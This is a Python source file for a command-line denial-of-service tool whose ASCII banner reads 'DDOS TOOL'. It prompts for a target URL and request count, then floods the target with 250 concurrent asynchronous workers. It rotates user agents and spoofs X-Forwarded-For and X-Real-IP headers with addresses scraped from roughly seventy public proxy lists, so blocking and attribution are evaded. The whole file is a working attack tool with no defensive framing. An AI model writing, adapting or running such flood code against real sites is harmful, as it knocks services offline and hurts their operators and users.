import aiohttp
import asyncio
import random
import itertools
import time
import re
import string
import sys
import shutil
from colorama import Fore, init

init(autoreset=True)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
] + open("user.txt").read().splitlines()
proxy_sources = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/userxd001/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://api.proxyscrape.com/?request=displayproxies&protocol=http",
    "https://proxyspace.pro/http.txt",
    "https://multiproxy.org/txt_all/proxy.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
    "https://raw.githubusercontent.com/roetsec/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/roetsec/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/roetsec/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
    "https://raw.githubusercontent.com/ProxyDown/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/ProxyDown/proxy-list/main/https.txt",
    "https://raw.githubusercontent.com/ProxyDown/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/ProxyDown/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/https/global/https_checked.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
]


class CliAttacker:
    def __init__(self, target_url, num_requests):
        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = 250
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None

    def log(self, message):
        print(f"{message}{Fore.RESET}")

    async def fetch_ip_addresses(self, url):
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            try:
                async with session.get(url) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
                    return ip_addresses
            except:
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks)
        all_ips = [ip for sublist in ip_lists for ip in sublist]
        if len(all_ips) < 1000:
            all_ips.extend([f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(1000)])
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "X-Real-IP": ip_address,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Referer": self.target_url,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        }
        try:
            async with session.get(self.target_url, headers=headers, timeout=3) as response:
                self.success_count += 1
                if self.success_count % 50 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.success_count / elapsed if elapsed > 0 else 0
                    self.log(Fore.RED + f"Requests: {self.success_count} | Rate: {rate:.1f}/s | IP: {ip_address}")
        except:
            self.fail_count += 1

    async def attack_worker(self, session, ip_cycle, worker_id):
        while self.success_count + self.fail_count < self.num_requests:
            await self.send_request(session, next(ip_cycle))

    async def attack(self):
        self.start_time = time.time()
        self.log(Fore.CYAN + "Fetching proxy list...")
        
        ip_list = await self.get_all_ips()
        if not ip_list:
            ip_list = [f"10.0.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(2000)]
        self.log(Fore.CYAN + f"Loaded {len(user_agents)} User-Agents")
        self.log(Fore.CYAN + f"Loaded {len(ip_list)} IPs | Starting attack...")
        ip_cycle = itertools.cycle(ip_list)

        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            workers = [self.attack_worker(session, ip_cycle, i) for i in range(self.max_concurrent)]
            await asyncio.gather(*workers)

        elapsed = time.time() - self.start_time
        self.log(Fore.BLUE + f"Attack completed: {self.success_count} success, {self.fail_count} failed in {elapsed:.2f}s")

    def run(self):
        asyncio.run(self.attack())

def print_banner():
    columns = shutil.get_terminal_size().columns
    banner = r"""
▓█████▄ ▓█████▄  ▒█████    ██████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
   ░       ░        ░ ░        ░                  ░ ░      ░ ░      ░  ░
 ░       ░                                                              
  Made By;  github.com/R3b00tdev |||| Refined by; github.com/keegan31
"""
    for line in banner.splitlines():
        print(f"{Fore.RED}{line.center(columns)}{Fore.RESET}")

if __name__ == "__main__":
    print_banner()
    target_url = input(Fore.RED + "Enter Target URL: ")
    num_requests = int(input(Fore.RED + "Enter Number of Requests: "))
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    attacker = CliAttacker(target_url, num_requests)
    attacker.run()
